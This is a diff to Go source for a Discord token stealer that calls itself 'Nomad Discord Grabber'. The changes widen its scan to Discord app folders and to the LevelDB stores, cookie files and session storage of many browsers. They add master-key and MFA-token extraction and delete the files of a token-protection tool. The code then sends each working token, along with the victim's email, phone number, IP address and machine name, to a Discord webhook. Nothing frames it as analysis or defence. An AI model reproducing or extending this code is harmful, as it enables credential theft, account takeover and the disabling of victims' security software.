@@ -2,12 +2,14 @@ package main
 
 import (
 	"bytes"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"net/http"
 	"os"
 	"path/filepath"
+	"regexp"
 	"sort"
 	"strings"
 	"sync"
@@ -20,7 +22,7 @@ var g_webhookURL = "https://discord.com/api/webhooks/INSERT_WEBHOOK_URL_HERE"
 
 const (
 	TOKEN_SCAN_TIMEOUT   = 30 * time.Second
-	MAX_CONCURRENT_FILES = 10
+	MAX_CONCURRENT_FILES = 20
 )
 
 type DiscordUser struct {
@@ -94,7 +96,8 @@ func GetTempPath() string {
 
 func Log(format string, args ...interface{}) {
 	if g_verbose {
-		fmt.Printf(format+"\n", args...)
+		timestamp := time.Now().Format("15:04:05")
+		fmt.Printf("[%s] "+format+"\n", append([]interface{}{timestamp}, args...)...)
 	}
 }
 
@@ -136,40 +139,40 @@ func GetUserBadges(flags int) string {
 	badges := []string{}
 
 	if flags&1<<0 != 0 {
-		badges = append(badges, "💡 Discord Employee")
+		badges = append(badges, "Discord Employee")
 	}
 	if flags&1<<1 != 0 {
-		badges = append(badges, "👑 Discord Partner")
+		badges = append(badges, "Discord Partner")
 	}
 	if flags&1<<2 != 0 {
-		badges = append(badges, "🚀 HypeSquad Events")
+		badges = append(badges, "HypeSquad Events")
 	}
 	if flags&1<<3 != 0 {
-		badges = append(badges, "🦸 Bug Hunter Level 1")
+		badges = append(badges, "Bug Hunter Level 1")
 	}
 	if flags&1<<6 != 0 {
-		badges = append(badges, "🌍 House Bravery")
+		badges = append(badges, "House Bravery")
 	}
 	if flags&1<<7 != 0 {
-		badges = append(badges, "🏠 House Brilliance")
+		badges = append(badges, "House Brilliance")
 	}
 	if flags&1<<8 != 0 {
-		badges = append(badges, "🌟 House Balance")
+		badges = append(badges, "House Balance")
 	}
 	if flags&1<<9 != 0 {
-		badges = append(badges, "📆 Early Supporter")
+		badges = append(badges, "Early Supporter")
 	}
 	if flags&1<<10 != 0 {
-		badges = append(badges, "🐞 Bug Hunter Level 2")
+		badges = append(badges, "Bug Hunter Level 2")
 	}
 	if flags&1<<11 != 0 {
-		badges = append(badges, "🤖 Verified Bot Developer")
+		badges = append(badges, "Verified Bot Developer")
 	}
 	if flags&1<<12 != 0 {
-		badges = append(badges, "🔥 Active Developer")
+		badges = append(badges, "Active Developer")
 	}
 	if flags&1<<14 != 0 {
-		badges = append(badges, "🏆 Certified Moderator")
+		badges = append(badges, "Certified Moderator")
 	}
 
 	if len(badges) == 0 {
@@ -182,11 +185,11 @@ func GetUserBadges(flags int) string {
 func GetNitroLevel(premiumType int) string {
 	switch premiumType {
 	case 1:
-		return "✅ Nitro Classic"
+		return "Nitro Classic"
 	case 2:
-		return "👑 Nitro Boost"
+		return "Nitro Boost"
 	default:
-		return "❌ No Nitro"
+		return "No Nitro"
 	}
 }
 
@@ -277,9 +280,9 @@ func SendTokenToWebhook(token string, userInfo *DiscordUser) error {
 	}
 
 	embed := WebhookEmbed{
-		Title:       "🎯 Discord Data - Nomad Discord Grabber",
+		Title:       "Discord Data - Nomad Discord Grabber",
 		Color:       0x5865F2,
-		Description: fmt.Sprintf("**%s#%s**", userInfo.Username, userInfo.Discriminator),
+		Description: fmt.Sprintf("**%s**", userInfo.Username),
 		Thumbnail: &WebhookThumbnail{
 			URL: GetAvatarURL(userInfo.ID, userInfo.Avatar),
 		},
@@ -294,37 +297,37 @@ func SendTokenToWebhook(token string, userInfo *DiscordUser) error {
 		Timestamp: time.Now().UTC().Format(time.RFC3339),
 		Fields: []WebhookEmbedField{
 			{
-				Name:   "👤 Username",
-				Value:  fmt.Sprintf("@%s#%s", userInfo.Username, userInfo.Discriminator),
+				Name:   "Username",
+				Value:  fmt.Sprintf("@%s", userInfo.Username),
 				Inline: true,
 			},
 			{
-				Name:   "🖥️ Machine IP",
+				Name:   "Machine IP",
 				Value:  fmt.Sprintf("`%s` | `%s`", machineIP, computerName),
 				Inline: true,
 			},
 			{
-				Name:   "✨ Nitro",
+				Name:   "Nitro",
 				Value:  GetNitroLevel(userInfo.Nitro),
 				Inline: true,
 			},
 			{
-				Name:   "🎖️ Badges",
+				Name:   "Badges",
 				Value:  GetUserBadges(userInfo.Flags),
 				Inline: false,
 			},
 			{
-				Name:   "📱 Phone Number",
+				Name:   "Phone Number",
 				Value:  phoneValue,
 				Inline: true,
 			},
 			{
-				Name:   "📧 Email",
+				Name:   "Email",
 				Value:  emailValue,
 				Inline: true,
 			},
 			{
-				Name:   "🔑 Token",
+				Name:   "Token",
 				Value:  fmt.Sprintf("||`%s`||", token),
 				Inline: false,
 			},
@@ -355,7 +358,7 @@ func SendTokenToWebhook(token string, userInfo *DiscordUser) error {
 }
 
 func manageSecurityServices() {
-	Log("\n🔒 Rimozione servizi di sicurezza...")
+	Log("\nremoving security services...")
 	protectorPath := filepath.Join(GetAppDataPath(), "DiscordTokenProtector")
 	files := []string{"DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"}
 
@@ -363,10 +366,10 @@ func manageSecurityServices() {
 		fullPath := filepath.Join(protectorPath, file)
 		if err := os.Remove(fullPath); err != nil {
 			if !os.IsNotExist(err) {
-				Log("⚠️ Errore nella rimozione di %s: %v", file, err)
+				Log("error removing %s: %v", file, err)
 			}
 		} else {
-			Log("✅ Rimosso: %s", fullPath)
+			Log("removed: %s", fullPath)
 		}
 	}
 }
@@ -411,7 +414,7 @@ func IsTokenWorkingFast(token string) bool {
 }
 
 func collectAndSendTokens() []string {
-	Log("\n🎫 Grabbing Discord tokens...")
+	Log("\ngrabbings discord tokens...")
 	roaming := GetAppDataPath()
 	local := GetLocalAppDataPath()
 
@@ -420,41 +423,190 @@ func collectAndSendTokens() []string {
 		Path      string
 		IsDiscord bool
 		MasterKey []byte
+		Priority  int
 	}
+	var paths []PathEntry
+	Log("PRIORITY 1: scanning Discord app directories...")
 
-	paths := []PathEntry{}
-
-	browserPaths := []struct {
-		name    string
-		base    string
-		profile string
-	}{
-		{"Chrome", "Google\\Chrome", "Default"},
-		{"Edge", "Microsoft\\Edge", "Default"},
-		{"Opera", "Opera Software\\Opera Stable", "Default"},
-		{"Brave", "BraveSoftware\\Brave-Browser", "Default"},
+	discordPaths := []string{"discord", "discordcanary", "discordptb", "discorddevelopment"}
+	discordPathVariants := []string{
+		filepath.Join(roaming, "discord"),
+		filepath.Join(roaming, "discordcanary"),
+		filepath.Join(roaming, "discordptb"),
+		filepath.Join(roaming, "discorddevelopment"),
+		filepath.Join(local, "discord"),
+		filepath.Join(local, "discordcanary"),
+		filepath.Join(local, "discordptb"),
+		filepath.Join(local, "discorddevelopment"),
+		filepath.Join(local, "Discord"),
 	}
-
-	for _, bp := range browserPaths {
-		fullPath := filepath.Join(local, bp.base, "User Data", bp.profile, "Local Storage", "leveldb")
-		if info, err := os.Stat(fullPath); err == nil && info.IsDir() {
-			paths = append(paths, PathEntry{Name: bp.name, Path: fullPath, IsDiscord: false})
-		}
-	}
-
-	discordPaths := []string{"discord", "discordcanary", "discordptb"}
 	for _, dp := range discordPaths {
-		fullPath := filepath.Join(roaming, dp, "Local Storage", "leveldb")
-		if info, err := os.Stat(fullPath); err == nil && info.IsDir() {
-			masterKey := []byte{}
-			localStatePath := filepath.Join(roaming, dp, "Local State")
-			if _, err := os.Stat(localStatePath); err == nil {
-
-				masterKey = []byte("dummy_key")
+		found := false
+		for _, basePath := range discordPathVariants {
+			Log("  checking %s in %s...", dp, filepath.Base(basePath))
+			levelDBPath := filepath.Join(basePath, "Local Storage", "leveldb")
+			if info, err := os.Stat(levelDBPath); err == nil && info.IsDir() {
+				masterKey := []byte{}
+				localStatePath := filepath.Join(basePath, "Local State")
+				if data, err := ioutil.ReadFile(localStatePath); err == nil {
+					masterKey = extractDiscordMasterKey(data)
+					if masterKey == nil {
+						masterKey = []byte("dummy_key")
+					}
+				}
+				paths = append(paths, PathEntry{
+					Name:      dp,
+					Path:      levelDBPath,
+					IsDiscord: true,
+					MasterKey: masterKey,
+					Priority:  1,
+				})
+				Log("  found %s", dp)
+				found = true
+				break
 			}
-			paths = append(paths, PathEntry{Name: dp, Path: fullPath, IsDiscord: true, MasterKey: masterKey})
+		}
+		if !found {
+			Log("  %s not found", dp)
 		}
 	}
+
+	programData := os.Getenv("ProgramData")
+	if programData != "" {
+		for _, dp := range discordPaths {
+			Log("  checking %s in ProgramData...", dp)
+			discordPath := filepath.Join(programData, dp, "Local Storage", "leveldb")
+			if info, err := os.Stat(discordPath); err == nil && info.IsDir() {
+				paths = append(paths, PathEntry{Name: dp + "-ProgramData", Path: discordPath, IsDiscord: true, Priority: 1})
+				Log("  found %s-ProgramData", dp)
+			} else {
+				Log("  %s-ProgramData not found", dp)
+			}
+		}
+	}
+
+	Log("PRIORITY 2: scanning Chrome directories...")
+
+	chromeProfiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3"}
+	for _, profile := range chromeProfiles {
+		Log("  checking Chrome %s LevelDB...", profile)
+		levelDBPath := filepath.Join(local, "Google\\Chrome", "User Data", profile, "Local Storage", "leveldb")
+		if info, err := os.Stat(levelDBPath); err == nil && info.IsDir() {
+			paths = append(paths, PathEntry{Name: fmt.Sprintf("Chrome-%s", profile), Path: levelDBPath, Priority: 2})
+			Log("  found Chrome %s LevelDB", profile)
+		} else {
+			Log("  Chrome %s LevelDB not found", profile)
+		}
+
+		Log("  checking Chrome %s Cookies...", profile)
+		cookiesPath := filepath.Join(local, "Google\\Chrome", "User Data", profile, "Network", "Cookies")
+		if _, err := os.Stat(cookiesPath); err == nil {
+			paths = append(paths, PathEntry{Name: fmt.Sprintf("Chrome-%s-Cookies", profile), Path: cookiesPath, Priority: 2})
+			Log("  found Chrome %s Cookies", profile)
+		} else {
+			Log("  Chrome %s Cookies not found", profile)
+		}
+	}
+
+	Log("PRIORITY 3: scanning Edge directories...")
+
+	edgeProfiles := []string{"Default", "Profile 1", "Profile 2"}
+	for _, profile := range edgeProfiles {
+
+		Log("  checking Edge %s LevelDB...", profile)
+		levelDBPath := filepath.Join(local, "Microsoft\\Edge", "User Data", profile, "Local Storage", "leveldb")
+		if info, err := os.Stat(levelDBPath); err == nil && info.IsDir() {
+			paths = append(paths, PathEntry{Name: fmt.Sprintf("Edge-%s", profile), Path: levelDBPath, Priority: 3})
+			Log("  found Edge %s LevelDB", profile)
+		} else {
+			Log("  Edge %s LevelDB not found", profile)
+		}
+
+		Log("  checking Edge %s Cookies...", profile)
+		cookiesPath := filepath.Join(local, "Microsoft\\Edge", "User Data", profile, "Network", "Cookies")
+		if _, err := os.Stat(cookiesPath); err == nil {
+			paths = append(paths, PathEntry{Name: fmt.Sprintf("Edge-%s-Cookies", profile), Path: cookiesPath, Priority: 3})
+			Log("  found Edge %s Cookies", profile)
+		} else {
+			Log("  Edge %s Cookies not found", profile)
+		}
+	}
+
+	Log("PRIORITY 4: scanning Firefox directories...")
+
+	firefoxProfiles, _ := filepath.Glob(filepath.Join(roaming, "Mozilla\\Firefox", "Profiles", "*"))
+	for _, profile := range firefoxProfiles {
+		profileName := filepath.Base(profile)
+		Log("  checking Firefox %s...", profileName)
+		if info, err := os.Stat(profile); err == nil && info.IsDir() {
+			cookiesPath := filepath.Join(profile, "cookies.sqlite")
+			if _, err := os.Stat(cookiesPath); err == nil {
+				paths = append(paths, PathEntry{Name: "Firefox-" + profileName, Path: profile, Priority: 4})
+				Log("  found Firefox %s", profileName)
+			} else {
+				Log("  Firefox %s cookies not found", profileName)
+			}
+		} else {
+			Log("  Firefox %s directory not found", profileName)
+		}
+	}
+
+	Log("PRIORITY 5: scanning other browsers...")
+
+	otherBrowsers := []struct {
+		name string
+		base string
+	}{
+		{"Opera", "Opera Software\\Opera Stable"},
+		{"Opera GX", "Opera Software\\Opera GX Stable"},
+		{"Opera Beta", "Opera Software\\Opera Beta"},
+		{"Brave", "BraveSoftware\\Brave-Browser"},
+		{"Brave Beta", "BraveSoftware\\Brave-Browser Beta"},
+		{"Brave Nightly", "BraveSoftware\\Brave-Browser Nightly"},
+		{"Vivaldi", "Vivaldi"},
+		{"Yandex", "Yandex\\YandexBrowser"},
+		{"CocCoc", "CocCoc\\Browser"},
+		{"Chromium", "Chromium"},
+		{"360 Browser", "360Browser\\Browser"},
+		{"Chrome Beta", "Google\\Chrome Beta"},
+		{"Chrome Dev", "Google\\Chrome Dev"},
+		{"Chrome Canary", "Google\\Chrome SxS"},
+	}
+
+	for _, browser := range otherBrowsers {
+		Log("  checking %s LevelDB...", browser.name)
+		fullPath := filepath.Join(local, browser.base, "User Data", "Default", "Local Storage", "leveldb")
+		if info, err := os.Stat(fullPath); err == nil && info.IsDir() {
+			paths = append(paths, PathEntry{Name: browser.name, Path: fullPath, Priority: 5})
+			Log("  found %s LevelDB", browser.name)
+		} else {
+			Log("  %s LevelDB not found", browser.name)
+		}
+
+		Log("  checking %s Cookies...", browser.name)
+		cookiesPath := filepath.Join(local, browser.base, "User Data", "Default", "Network", "Cookies")
+		if _, err := os.Stat(cookiesPath); err == nil {
+			paths = append(paths, PathEntry{Name: browser.name + "-Cookies", Path: cookiesPath, Priority: 5})
+			Log("  found %s Cookies", browser.name)
+		} else {
+			Log("  %s Cookies not found", browser.name)
+		}
+
+		Log("  checking %s Session Storage...", browser.name)
+		sessionPath := filepath.Join(local, browser.base, "User Data", "Default", "Session Storage")
+		if info, err := os.Stat(sessionPath); err == nil && info.IsDir() {
+			paths = append(paths, PathEntry{Name: browser.name + "-Session", Path: sessionPath, Priority: 5})
+			Log("  found %s Session Storage", browser.name)
+		} else {
+			Log("  %s Session Storage not found", browser.name)
+		}
+	}
+
+	sort.Slice(paths, func(i, j int) bool {
+		return paths[i].Priority < paths[j].Priority
+	})
+
+	Log("total locations to scan: %d\n", len(paths))
 
 	tokens := []string{}
 	seenTokens := make(map[string]bool)
@@ -468,9 +620,23 @@ func collectAndSendTokens() []string {
 		sem := make(chan struct{}, MAX_CONCURRENT_FILES)
 
 		for _, entry := range paths {
-			files, _ := filepath.Glob(filepath.Join(entry.Path, "*.ldb"))
-			logFiles, _ := filepath.Glob(filepath.Join(entry.Path, "*.log"))
-			files = append(files, logFiles...)
+			files := []string{}
+
+			if strings.Contains(entry.Path, "leveldb") {
+				ldbFiles, _ := filepath.Glob(filepath.Join(entry.Path, "*.ldb"))
+				logFiles, _ := filepath.Glob(filepath.Join(entry.Path, "*.log"))
+				files = append(files, ldbFiles...)
+				files = append(files, logFiles...)
+			} else if strings.HasSuffix(entry.Path, "Cookies") {
+				files = append(files, entry.Path)
+			} else {
+				filepath.Walk(entry.Path, func(path string, info os.FileInfo, err error) error {
+					if err == nil && !info.IsDir() {
+						files = append(files, path)
+					}
+					return nil
+				})
+			}
 
 			sort.Slice(files, func(i, j int) bool {
 				infoI, _ := os.Stat(files[i])
@@ -479,6 +645,11 @@ func collectAndSendTokens() []string {
 			})
 
 			for _, file := range files {
+				fileInfo, err := os.Stat(file)
+				if err != nil || fileInfo.Size() > 50*1024*1024 || fileInfo.Size() < 100 {
+					continue
+				}
+
 				wg.Add(1)
 				sem <- struct{}{}
 
@@ -497,13 +668,25 @@ func collectAndSendTokens() []string {
 						return
 					}
 
-					foundTokens := FindTokensInChunk(data, masterKey)
+					if len(data) > 10*1024*1024 {
+						data = data[:10*1024*1024]
+					}
+
+					foundTokens := []string{}
+					foundTokens = append(foundTokens, FindTokensInChunk(data, masterKey)...)
+
+					if strings.HasSuffix(filePath, "Cookies") || strings.HasSuffix(filePath, "cookies.sqlite") {
+						cookieTokens := ExtractTokensFromCookies(data)
+						foundTokens = append(foundTokens, cookieTokens...)
+					}
+
 					if len(foundTokens) > 0 {
 						tokensMutex.Lock()
 						for _, token := range foundTokens {
 							if !seenTokens[token] && IsTokenWorkingFast(token) {
 								seenTokens[token] = true
 								tokens = append(tokens, token)
+								Log("found valid token from %s: %s...", browserName, token[:20])
 							}
 						}
 						tokensMutex.Unlock()
@@ -519,25 +702,35 @@ func collectAndSendTokens() []string {
 	select {
 	case <-done:
 	case <-timeout:
-		Log("⚠️ Timeout raggiunto durante la scansione dei token")
+		Log("timeout reached during token scanning")
 	}
 
-	Log("✅ Found %d valid Discord tokens", len(tokens))
+	uniqueTokens := []string{}
+	seenFinal := make(map[string]bool)
+	for _, token := range tokens {
+		if !seenFinal[token] {
+			seenFinal[token] = true
+			uniqueTokens = append(uniqueTokens, token)
+		}
+	}
+	tokens = uniqueTokens
+
+	Log("found %d valid discord tokens", len(tokens))
 
 	for i, token := range tokens {
-		Log("📤 Invio token %d/%d...", i+1, len(tokens))
+		Log("sending token %d/%d...", i+1, len(tokens))
 
 		userInfo, err := GetDiscordUserInfo(token)
 		if err != nil {
-			Log("❌ Errore nel recupero info per token %d: %v", i+1, err)
+			Log("error retrieving info for token %d: %v", i+1, err)
 			continue
 		}
 
 		err = SendTokenToWebhook(token, userInfo)
 		if err != nil {
-			Log("❌ Errore nell'invio del token %d: %v", i+1, err)
+			Log("error sending token %d: %v", i+1, err)
 		} else {
-			Log("✅ Token %d inviato con successo!", i+1)
+			Log("token %d sent successfully!", i+1)
 		}
 
 		time.Sleep(500 * time.Millisecond)
@@ -546,33 +739,47 @@ func collectAndSendTokens() []string {
 	return tokens
 }
 
-func main() {
-	if g_verbose {
-		fmt.Println("=== Discord Token Manager ===")
-		fmt.Println("Nomad Discord Grabber")
-		fmt.Println(strings.Repeat("=", 40))
+func extractDiscordMasterKey(data []byte) []byte {
+	var result map[string]interface{}
+	json.Unmarshal(data, &result)
+
+	if osCrypt, ok := result["os_crypt"].(map[string]interface{}); ok {
+		if encryptedKey, ok := osCrypt["encrypted_key"].(string); ok {
+			decoded, err := base64.StdEncoding.DecodeString(encryptedKey)
+			if err == nil && len(decoded) > 5 {
+				return decoded[5:]
+			}
+		}
+	}
+	return nil
+}
+
+func ExtractTokensFromCookies(data []byte) []string {
+	tokens := []string{}
+	tokenRegex := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}`)
+	twoFactorRegex := regexp.MustCompile(`mfa\.[\w-]{84}`)
+
+	if strings.Contains(string(data), "discord.com") {
+		matches := tokenRegex.FindAllString(string(data), -1)
+		tokens = append(tokens, matches...)
+
+		mfaMatches := twoFactorRegex.FindAllString(string(data), -1)
+		for _, mfaToken := range mfaMatches {
+			tokens = append(tokens, mfaToken)
+		}
 	}
 
+	return tokens
+}
+
+func main() {
 	if validateRuntimeEnvironment() {
 		os.Exit(1)
 	}
 
 	manageSecurityServices()
 
-	tokens := collectAndSendTokens()
+	collectAndSendTokens()
 
-	if g_verbose {
-		fmt.Println("\n" + strings.Repeat("=", 40))
-		fmt.Printf("📊 Riepilogo Finale:\n")
-		fmt.Printf("Token validi trovati: %d\n", len(tokens))
-
-		if len(tokens) > 0 {
-			fmt.Println("\n✅ Tutti i token sono stati inviati al webhook!")
-		} else {
-			fmt.Println("❌ Nessun token valido trovato")
-		}
-
-		fmt.Println("\nPremi un tasto per uscire...")
-	}
 	os.Exit(0)
 }
